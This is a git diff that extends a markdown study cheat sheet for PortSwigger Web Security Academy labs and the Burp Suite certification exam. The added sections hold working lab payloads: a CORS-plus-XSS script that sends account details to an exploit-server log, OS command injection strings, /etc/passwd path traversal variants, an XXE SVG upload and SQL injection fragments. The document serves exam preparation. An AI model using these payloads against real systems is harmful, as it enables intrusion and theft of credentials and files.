@@ -62,6 +62,14 @@ URL fuzz:
 ffuf -u https://ID.web-security-academy.net/FUZZ -w /path/to/SecLists/Web-Content/common.txt -s -c
 ```
 
+To find [SecLists](https://github.com/danielmiessler/SecLists) in your system:
+```bash
+find / -iname "SecLists" 2>/dev/null
+```
+
+Other wordlists:  
+[burp-labs-wordlist.txt](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt)
+
 
 #### View source
 
@@ -122,6 +130,8 @@ git diff
 git log -- FILENAME
 git show COMMIT_ID:FILENAME
 ```
+
+[Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
 
 #### XSS
 
@@ -287,6 +297,23 @@ Use [Hackverter](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd
 
 #### CORS
 
+##### Chained with XSS to get subdomain access
+
+Indicators:  
+`Access-Control-Allow-Credentials` header is set to true.  
+The website uses subdomains like `stock.ID.web-security-academy.net`.  
+
+Set `Origin: https://SUBDOMAIN.ID.web-security-academy.net/`.
+
+[Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+
+Working payload for this lab:
+```html
+<script>
+document.location="http://stock.ID.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload=reqListener;req.open('get','https://ID.web-security-academy.net/accountDetails',true); req.withCredentials=true;req.send();function reqListener(){location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bthis.responseText; };</script>&storeId=1"
+</script>
+```
+
 #### JWT
 
 #### Change password
@@ -297,13 +324,74 @@ Use [Hackverter](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd
 
 #### OS command injections
 
+##### Blind, Output redirection
+
+Indicators:  
+The response delays with `;sleep 5;`.  
+Writable folders are present.
+
+Redirect the output to a writable file:
+```bash
+;whoami>/var/www/images/output.txt;
+;cat+/etc/hosts>>/var/www/images/output.txt;
+```
+
+[Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+
 #### XXE
+
+Indicators:  
+xml is used  
+
 
 #### LFI
 
+##### File Path Traversal
+
+Indicators:  
+`?filename=` parameter appears in a request.
+
+**Obfuscation techniques**:
+
+Mangled path:
+```bash
+....//....//....//....//etc/passwd
+```
+
+URL encode:
+```bash
+..%252f..%252f..%252fetc/passwd
+```
+Could be double encoded.
+
+Null byte:
+```bash
+../../../etc/passwd%00.png
+```
+
+
+[Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
+
 #### File uploading
 
+##### SVG file upload
+Indicators:  
+Image upload accepts svg files
+
+[Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
+
+working payload:
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
 #### SSRF
+
+
 
 #### SSTI
 
@@ -324,6 +412,12 @@ Determine the number of columns of the target:
 ```sql
 1 ORDER BY 1-- -
 ```
+
+or
+
+---sql
+1 UNION SELECT NULL,NULL-- -
+---
 
 List databases:
 ```sql
